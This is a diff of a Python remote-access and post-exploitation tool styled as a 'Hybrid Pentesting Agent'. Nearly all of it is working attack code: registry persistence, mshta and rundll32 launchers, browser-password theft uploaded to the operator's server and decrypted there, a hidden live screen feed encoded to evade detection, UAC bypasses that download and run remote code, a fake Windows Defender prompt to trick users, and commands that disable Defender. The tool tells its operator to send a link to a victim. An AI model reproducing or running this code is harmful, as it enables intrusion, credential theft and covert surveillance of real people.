             cmd = f'''try {{ $p = "{secure_path}"; New-Item -ItemType Directory -Force -Path $p -ErrorAction SilentlyContinue | Out-Null; $s='{tls_payload}'; $s | Out-File "$p\\{payload_name}" -Force; reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v OneDriveUpdate /d "powershell -w hidden -ep bypass -file `"$p\\{payload_name}`"" /f; echo "TLS Secure Persistence Installed in: $p" }} catch {{ echo "Error: $_" }}'''
-            console.print(f"[cyan]Installing TLS persistence to Safe Zone: {secure_path}...[/]")
+            console.print(
+                f"[cyan]Installing TLS persistence to Safe Zone: {secure_path}...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]{result}[/]")
             input("\n[Enter to continue]")
-        
+
         elif choice == "6":
             # LOLBin: mshta.exe launcher
-            console.print("[cyan]Creating mshta.exe launcher for existing payload...[/]")
+            console.print(
+                "[cyan]Creating mshta.exe launcher for existing payload...[/]")
             # This assumes payload already exists at %APPDATA%\winlogon.ps1
             cmd = '''mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -w hidden -f %APPDATA%\\winlogon.ps1"", 0:close")'''
             console.print(f"[dim]Executing: mshta vbscript:...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]Launched via mshta.exe[/]")
-            console.print(f"[yellow]Note: A new shell should connect if payload exists[/]")
+            console.print(
+                f"[yellow]Note: A new shell should connect if payload exists[/]")
             input("\n[Enter to continue]")
-        
+
         elif choice == "7":
             # LOLBin: rundll32 launcher
-            console.print("[cyan]Creating rundll32 launcher for existing payload...[/]")
+            console.print(
+                "[cyan]Creating rundll32 launcher for existing payload...[/]")
             # Uses JavaScript to spawn PowerShell
             cmd = r'''rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -w hidden -ep bypass -f %APPDATA%\winlogon.ps1")'''
             console.print(f"[dim]Executing: rundll32.exe javascript:...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]Launched via rundll32.exe[/]")
-            console.print(f"[yellow]Note: A new shell should connect if payload exists[/]")
+            console.print(
+                f"[yellow]Note: A new shell should connect if payload exists[/]")
             input("\n[Enter to continue]")
+
 
 def menu_steal_data():
     """Data theft submenu."""
@@ -1140,7 +1263,7 @@ def menu_steal_data():
             ("5", "Live Monitor (Video Feed)"),
             ("0", "← Back"),
         ])
-        
+
         if choice == "0":
             break
         elif choice == "1":
@@ -1152,7 +1275,8 @@ def menu_steal_data():
             # Save to ATTACKER machine
             loot_dir = os.path.join(os.path.dirname(__file__), "loot")
             os.makedirs(loot_dir, exist_ok=True)
-            loot_file = os.path.join(loot_dir, f"wifi_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
+            loot_file = os.path.join(
+                loot_dir, f"wifi_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
             with open(loot_file, 'w') as f:
                 f.write(result)
             console.print(f"[bold green]Saved to YOUR machine: {loot_file}[/]")
@@ -1165,7 +1289,8 @@ def menu_steal_data():
             # Save to ATTACKER machine
             loot_dir = os.path.join(os.path.dirname(__file__), "loot")
             os.makedirs(loot_dir, exist_ok=True)
-            loot_file = os.path.join(loot_dir, f"vault_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
+            loot_file = os.path.join(
+                loot_dir, f"vault_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
             with open(loot_file, 'w') as f:
                 f.write(result)
             console.print(f"[bold green]Saved to YOUR machine: {loot_file}[/]")
@@ -1180,14 +1305,14 @@ def menu_steal_data():
                 ("3", "Both"),
                 ("0", "← Back"),
             ])
-            
+
             if browser_choice == "0":
                 continue
-            
+
             console.print("[cyan]Exfiltrating browser data via HTTP...[/]")
-            
+
             target_ip = SHELL.addr[0] if SHELL.addr else 'unknown'
-            
+
             # Build browser array based on selection
             if browser_choice == "1":
                 browsers_ps = '@(@{Name="Chrome"; Path="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"})'
@@ -1201,7 +1326,7 @@ def menu_steal_data():
     @{Name="Chrome"; Path="$env:LOCALAPPDATA\\Google\\Chrome\\User Data"}
 )'''
                 console.print("[yellow]Target: Both browsers[/]")
-            
+
             cmd = f'''
 $ip = "{CFG.get_ip()}"
 $port = {CFG.http_port}
@@ -1218,10 +1343,10 @@ foreach ($b in $browsers) {{
         try {{
             $json = Get-Content $localState -Raw | ConvertFrom-Json
             $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-            $encKey = $encKey[5..($encKey.Length - 1)] 
+            $encKey = $encKey[5..($encKey.Length - 1)]
             $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
             $b64Key = [Convert]::ToBase64String($masterKey)
-            
+
             # Upload Key
             $url = "http://$ip:$port/ups?t=key&b=$($b.Name)&id=$id"
             try {{ Invoke-RestMethod -Uri $url -Method Post -Body $b64Key -ErrorAction SilentlyContinue }} catch {{}}
@@ -1238,11 +1363,11 @@ foreach ($b in $browsers) {{
                 Copy-Item $db $temp -Force -ErrorAction Stop
                 $bytes = [IO.File]::ReadAllBytes($temp)
                 $b64 = [Convert]::ToBase64String($bytes)
-                
+
                 # Upload DB
                 $url = "http://$ip:$port/ups?t=db&b=$($b.Name)&id=$id"
                 try {{ Invoke-RestMethod -Uri $url -Method Post -Body $b64 -ErrorAction SilentlyContinue }} catch {{}}
-                
+
                 Remove-Item $temp -Force
             }} catch {{}}
         }}
@@ -1251,96 +1376,120 @@ foreach ($b in $browsers) {{
 '''
             SHELL.execute(cmd)
             console.print("[yellow]Waiting for uploads...[/]")
-            time.sleep(3) # Give it a moment to upload
-            
+            time.sleep(3)  # Give it a moment to upload
+
             # --- LOCAL PROCESSING ---
             loot_dir = os.path.join(os.path.dirname(__file__), "loot")
-            
+
             # Check for uploaded files
             # Format: key_{id}_{browser}.txt, db_{id}_{browser}.txt
             import glob
-            
+
             found_data = False
-            
+
             # Decrypt locally
             import sqlite3
             import base64
-            
+
             if not CRYPTO_AVAILABLE:
-                console.print("[red]WARNING: 'cryptography' library not installed![/]")
-                console.print("[yellow]Browser password decryption requires: pip install cryptography[/]")
-                console.print("[dim]Files were exfiltrated but cannot be decrypted locally.[/]")
+                console.print(
+                    "[red]WARNING: 'cryptography' library not installed![/]")
+                console.print(
+                    "[yellow]Browser password decryption requires: pip install cryptography[/]")
+                console.print(
+                    "[dim]Files were exfiltrated but cannot be decrypted locally.[/]")
                 input("\n[Enter to continue]")
                 return
-            
+
             # Find all key files for this target
-            key_files = glob.glob(os.path.join(loot_dir, f"key_{target_ip}_*.txt"))
-            
+            key_files = glob.glob(
+                os.path.join(
+                    loot_dir,
+                    f"key_{target_ip}_*.txt"))
+
             final_results = ""
-            
+
             for kf in key_files:
                 try:
                     # Extract browser name from filename: key_IP_Browser.txt
                     fname = os.path.basename(kf)
-                    browser_name = fname.replace(f"key_{target_ip}_", "").replace(".txt", "")
-                    
+                    browser_name = fname.replace(
+                        f"key_{target_ip}_", "").replace(
+                        ".txt", "")
+
                     # Find corresponding DB file
-                    db_file = os.path.join(loot_dir, f"db_{target_ip}_{browser_name}.txt")
-                    if not os.path.exists(db_file): continue
-                    
+                    db_file = os.path.join(
+                        loot_dir, f"db_{target_ip}_{browser_name}.txt")
+                    if not os.path.exists(db_file):
+                        continue
+
                     found_data = True
-                    
+
                     # Load Key
-                    with open(kf, 'r') as f: b64_key = f.read().strip()
+                    with open(kf, 'r') as f:
+                        b64_key = f.read().strip()
                     key = base64.b64decode(b64_key)
-                    
+
                     # Load DB
-                    with open(db_file, 'r') as f: b64_db = f.read().strip()
-                    
+                    with open(db_file, 'r') as f:
+                        b64_db = f.read().strip()
+
                     # Save temp DB for sqlite3
-                    temp_db_path = os.path.join(loot_dir, f"temp_{target_ip}_{browser_name}.db")
+                    temp_db_path = os.path.join(
+                        loot_dir, f"temp_{target_ip}_{browser_name}.db")
                     with open(temp_db_path, "wb") as f:
                         f.write(base64.b64decode(b64_db))
-                        
+
                     if CRYPTO_AVAILABLE:
                         conn = sqlite3.connect(temp_db_path)
                         cursor = conn.cursor()
-                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                        
+                        cursor.execute(
+                            "SELECT origin_url, username_value, password_value FROM logins")
+
                         count = 0
                         for r in cursor.fetchall():
                             url = r[0]
                             user = r[1]
                             enc_pass = r[2]
-                            if not enc_pass or len(enc_pass) < 15: continue
-                            
+                            if not enc_pass or len(enc_pass) < 15:
+                                continue
+
                             try:
                                 if enc_pass[:3] in [b'v10', b'v11']:
                                     nonce = enc_pass[3:15]
                                     ciphertext = enc_pass[15:-16]
                                     tag = enc_pass[-16:]
                                     aes = AESGCM(key)
-                                    plaintext = aes.decrypt(nonce, ciphertext + tag, None)
+                                    plaintext = aes.decrypt(
+                                        nonce, ciphertext + tag, None)
                                     final_results += f"{browser_name} | {url} | {user} | {plaintext.decode()}\n"
                                     count += 1
-                            except: pass
+                            except BaseException:
+                                pass
                         conn.close()
                         if count > 0:
-                            console.print(f"[green]Decrypted {count} passwords from {browser_name}[/]")
+                            console.print(
+                                f"[green]Decrypted {count} passwords from {browser_name}[/]")
                         os.remove(temp_db_path)
-                    
+
                 except Exception as e:
-                    console.print(f"[red]Error processing {browser_name}: {e}[/]")
+                    console.print(
+                        f"[red]Error processing {browser_name}: {e}[/]")
 
             if final_results:
-                loot_file = os.path.join(loot_dir, f"decrypted_{target_ip}.txt")
+                loot_file = os.path.join(
+                    loot_dir, f"decrypted_{target_ip}.txt")
                 with open(loot_file, 'w') as f:
                     f.write(final_results)
-                console.print(Panel(final_results, title="[green]Decrypted Passwords[/]"))
+                console.print(
+                    Panel(
+                        final_results,
+                        title="[green]Decrypted Passwords[/]"))
                 console.print(f"[bold green]Saved to: {loot_file}[/]")
             elif not found_data:
-                console.print("[red]No data received via upload. Blocked by firewall?[/]")
-                
+                console.print(
+                    "[red]No data received via upload. Blocked by firewall?[/]")
+
             input("\n[Enter to continue]")
         elif choice == "4":
             cmd = 'systeminfo | findstr /B /C:"OS" /C:"Host" /C:"System"; echo "---"; whoami /all'
@@ -1354,7 +1503,7 @@ foreach ($b in $browsers) {{
             import base64
             ip = CFG.get_ip()
             port = CFG.http_port
-            
+
             # PowerShell Camera Script - will be encoded to bypass EDR
             ps_cam = f'''
 $ip = "{ip}"; $port = {port};
@@ -1367,40 +1516,47 @@ while($true) {{
         $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;
         $g = [System.Drawing.Graphics]::FromImage($bmp);
         $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size);
-        
+
         $w = 800;
         $h = [int]($screen.Height * ($w / $screen.Width));
         $bmp2 = New-Object System.Drawing.Bitmap $w, $h;
         $g2 = [System.Drawing.Graphics]::FromImage($bmp2);
         $g2.DrawImage($bmp, 0, 0, $w, $h);
-        
+
         $ms = New-Object IO.MemoryStream;
         $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {{ $_.MimeType -eq "image/jpeg" }};
         $params = New-Object System.Drawing.Imaging.EncoderParameters(1);
         $params.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 50);
         $bmp2.Save($ms, $codec, $params);
         $bytes = $ms.ToArray();
-        
+
         $url = "http://$ip`:$port/ups?t=live";
         Invoke-RestMethod -Uri $url -Method Post -Body $bytes -TimeoutSec 1 -ErrorAction SilentlyContinue;
-        
+
         $g.Dispose(); $g2.Dispose(); $bmp.Dispose(); $bmp2.Dispose(); $ms.Dispose();
     }} catch {{}}
     Start-Sleep -Milliseconds 500;
 }}
 '''
             # Base64 encode the payload for EDR bypass
-            encoded_payload = base64.b64encode(ps_cam.encode('utf-16-le')).decode()
-            
+            encoded_payload = base64.b64encode(
+                ps_cam.encode('utf-16-le')).decode()
+
             # Execute as background job with encoded command
             job_cmd = f'Start-Job -ScriptBlock {{ powershell -enc {encoded_payload} }}'
-            
-            console.print("[cyan]Starting Live Camera Feed on victim... (Base64 encoded for stealth)[/]")
+
+            console.print(
+                "[cyan]Starting Live Camera Feed on victim... (Base64 encoded for stealth)[/]")
             SHELL.execute(job_cmd)
-            
-            console.print(Panel(f"[bold green]LIVE FEED STARTED![/]\n\nOpen this URL in your browser:\n[white]http://{ip}:{port}/watch[/white]", title="Surveillance"))
-            console.print("[dim](Press Enter to return to menu. The feed keeps running)[/]")
+
+            console.print(
+                Panel(
+                    f"[bold green]LIVE FEED STARTED![/]\n\nOpen this URL in your browser:\n[white]http://{ip}:{port}/watch[/white]",
+                    title="Surveillance"))
+            console.print(
+                "[dim](Press Enter to return to menu. The feed keeps running)[/]")
             input()
+
 
 def menu_privesc():
     """Privilege escalation submenu."""
@@ -1416,7 +1572,7 @@ def menu_privesc():
             ("7", "Check Defender Status"),
             ("0", "← Back"),
         ])
-        
+
         if choice == "0":
             break
         elif choice == "1":
@@ -1432,7 +1588,7 @@ def menu_privesc():
             ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
             import base64
             encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
-            
+
             cmd = f'''$c="powershell -w hidden -enc {encoded_cmd}";New-Item -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process eventvwr.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force'''
             console.print("[cyan]Attempting eventvwr UAC bypass...[/]")
             result = SHELL.execute(cmd)
@@ -1445,7 +1601,7 @@ def menu_privesc():
             ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
             import base64
             encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
-            
+
             cmd = f'''$c="powershell -w hidden -enc {encoded_cmd}";New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null;New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process computerdefaults.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force'''
             console.print("[cyan]Attempting computerdefaults UAC bypass...[/]")
             result = SHELL.execute(cmd)
@@ -1457,23 +1613,25 @@ def menu_privesc():
             # Use Base64 encoded command to avoid quote escaping issues
             ip = CFG.get_ip()
             port = CFG.listener_port
-            
+
             # Build a simple PowerShell command that downloads and runs /s
             ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
-            
+
             # Base64 encode it for clean passing through VBS
             import base64
             encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
-            
+
             vbs_cmd = f'''$v=@"
 Set objShell = CreateObject("WScript.Shell")
 MsgBox "Windows Defender requires elevated permissions to complete a security scan." & vbCrLf & vbCrLf & "Click OK to authorize.", vbExclamation, "Windows Defender - Security Alert"
 objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -ep bypass -enc {encoded_cmd}'", 0, False
 "@;$v|Out-File "$env:TEMP\\defender.vbs" -Encoding ASCII;Start-Process wscript -ArgumentList "$env:TEMP\\defender.vbs"'''
-            console.print("[cyan]Showing fake Defender dialog + UAC prompt...[/]")
+            console.print(
+                "[cyan]Showing fake Defender dialog + UAC prompt...[/]")
             result = SHELL.execute(vbs_cmd)
             console.print(f"[green]{result}[/]")
-            console.print("[yellow]User will see Defender dialog, then UAC prompt. If accepted, elevated shell connects![/]")
+            console.print(
+                "[yellow]User will see Defender dialog, then UAC prompt. If accepted, elevated shell connects![/]")
             # Wait for new elevated shell
             SHELL.wait_for_new_shell(timeout=30)
             input("\n[Enter to continue]")
@@ -1483,7 +1641,10 @@ objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb 
             console.print("[yellow]This REQUIRES admin privileges![/]")
             cmd = 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; echo "Defender disabled (if admin)!"'
             result = SHELL.execute(cmd)
-            console.print(Panel(result, title="[green]Disable Defender Result[/]"))
+            console.print(
+                Panel(
+                    result,
+                    title="[green]Disable Defender Result[/]"))
             input("\n[Enter to continue]")
         elif choice == "6":
             # Add exclusion path
@@ -1491,7 +1652,10 @@ objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb 
             console.print("[yellow]This REQUIRES admin privileges![/]")
             cmd = 'Add-MpPreference -ExclusionPath "C:\\"; Add-MpPreference -ExclusionPath "$env:TEMP"; Add-MpPreference -ExclusionProcess "powershell.exe"; echo "Exclusions added (if admin)!"'
             result = SHELL.execute(cmd)
-            console.print(Panel(result, title="[green]Add Exclusion Result[/]"))
+            console.print(
+                Panel(
+                    result,
+                    title="[green]Add Exclusion Result[/]"))
             input("\n[Enter to continue]")
         elif choice == "7":
             # Check Defender status
@@ -1501,11 +1665,12 @@ objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb 
             console.print(Panel(result, title="[green]Defender Status[/]"))
             input("\n[Enter to continue]")
 
+
 def raw_shell():
     """Interactive raw shell mode."""
     console.print("[bold cyan]RAW SHELL MODE[/]")
     console.print("[dim]Type 'exit' to return to menu[/]\n")
-    
+
     while True:
         try:
             cmd = input("PS> ")
@@ -1516,16 +1681,20 @@ def raw_shell():
         except KeyboardInterrupt:
             break
 
+
 def post_exploitation_menu():
     """Main post-exploitation menu after shell connects."""
     while True:
         clear_screen()
-        
+
         # Check if shell is still connected
         status = "[bold green]Connected[/]" if SHELL.connected else "[bold red]✗ Disconnected[/]"
-        console.print(Panel(f"{status}\n[dim]Target: {SHELL.addr[0] if SHELL.addr else 'N/A'}[/]", 
-                           title="ACTIVE SESSION", border_style="green" if SHELL.connected else "red"))
-        
+        console.print(
+            Panel(
+                f"{status}\n[dim]Target: {SHELL.addr[0] if SHELL.addr else 'N/A'}[/]",
+                title="ACTIVE SESSION",
+                border_style="green" if SHELL.connected else "red"))
+
         choice = show_menu("What do you want to do?", [
             ("1", "Install Persistence"),
             ("2", "Steal Data"),
@@ -1536,9 +1705,14 @@ def post_exploitation_menu():
             ("7", "AI Assistant (tell it what to do)"),
             ("0", "Exit"),
         ])
-        
+
         if choice == "0":
-            if Prompt.ask("[bold]Really exit?[/]", choices=["y", "n"], default="n") == "y":
+            if Prompt.ask(
+                    "[bold]Really exit?[/]",
+                    choices=[
+                        "y",
+                        "n"],
+                    default="n") == "y":
                 break
         elif choice == "1":
             menu_persistence()
@@ -1549,7 +1723,8 @@ def post_exploitation_menu():
         elif choice == "4":
             raw_shell()
         elif choice == "5":
-            console.print("[cyan]Waiting for shell to reconnect (persistence will auto-connect)...[/]")
+            console.print(
+                "[cyan]Waiting for shell to reconnect (persistence will auto-connect)...[/]")
             SHELL.wait_for_new_shell(timeout=60)
         elif choice == "6":
             autonomous_mode()
@@ -1560,30 +1735,39 @@ def post_exploitation_menu():
 # MAIN - Phase 1: Get Shell, Phase 2: Menu
 # ============================================================================
 
+
 def main():
     import argparse
     parser = argparse.ArgumentParser(description='Hybrid Pentesting Agent')
-    parser.add_argument('--domain', help='Custom domain (e.g., yourname.duckdns.org)')
+    parser.add_argument(
+        '--domain',
+        help='Custom domain (e.g., yourname.duckdns.org)')
     parser.add_argument('--cert', help='Path to Let\'s Encrypt fullchain.pem')
     parser.add_argument('--key', help='Path to Let\'s Encrypt privkey.pem')
     parser.add_argument('--port', type=int, default=4444, help='Listener port')
-    parser.add_argument('--http-port', type=int, default=8080, help='HTTP server port')
+    parser.add_argument(
+        '--http-port',
+        type=int,
+        default=8080,
+        help='HTTP server port')
     args = parser.parse_args()
-    
+
     # Apply config
     CFG.listener_port = args.port
     CFG.http_port = args.http_port
-    
+
     # Check for Let's Encrypt cert
     if args.domain and args.cert and args.key:
         if CFG.use_letsencrypt_cert(args.domain, args.cert, args.key):
-            console.print(f"[green]Using Let's Encrypt cert for {args.domain}[/]")
+            console.print(
+                f"[green]Using Let's Encrypt cert for {args.domain}[/]")
         else:
-            console.print(f"[red]Failed to load Let's Encrypt cert - files not found[/]")
+            console.print(
+                f"[red]Failed to load Let's Encrypt cert - files not found[/]")
             return
-    
+
     clear_screen()
-    
+
     banner = """
     ╔═══════════════════════════════════════════════════════════════╗
     ║        HYBRID PENTESTING AGENT                          ║
@@ -1593,7 +1777,7 @@ def main():
     ╚═══════════════════════════════════════════════════════════════╝
     """
     console.print(banner, style="bold cyan")
-    
+
     ip = CFG.get_ip()
     console.print(f"[bold]Your IP/Domain:[/] {ip}")
     console.print(f"[bold]Listener:[/] {CFG.listener_port}")
@@ -1601,17 +1785,18 @@ def main():
     if CFG.letsencrypt_cert:
         console.print(f"[bold green]TLS:[/] Let's Encrypt (legitimate cert)")
     else:
-        console.print(f"[bold yellow]TLS:[/] Self-signed (may trigger warnings)")
+        console.print(
+            f"[bold yellow]TLS:[/] Self-signed (may trigger warnings)")
     console.print()
-    
+
     # Phase 1: Start servers
     console.print("[cyan]Starting HTTP server...[/]")
     start_http_server()
     console.print(f"[green]HTTP server on port {CFG.http_port}[/]")
-    
+
     console.print("[cyan]Starting listener...[/]")
     SHELL.start_listener(CFG.listener_port)
-    
+
     console.print(Panel(f"""
 [bold yellow]Send this link to victim:[/]
 
@@ -1619,20 +1804,21 @@ def main():
 
 Waiting for shell connection...
 """, title="PHASE 1: GET SHELL", border_style="yellow"))
-    
+
     # Wait for shell
     if SHELL.wait_for_connection(timeout=600):
         console.print("\n[bold green]SHELL OBTAINED![/]")
         console.print("[cyan]Entering post-exploitation menu...[/]\n")
         input("[Press Enter to continue]")
-        
+
         # Phase 2: Post-exploitation menu
         post_exploitation_menu()
     else:
         console.print("[red]Timeout waiting for connection.[/]")
-    
+
     SHELL.close()
     console.print("[yellow]Goodbye![/]")
+
 
 if __name__ == "__main__":
     try:
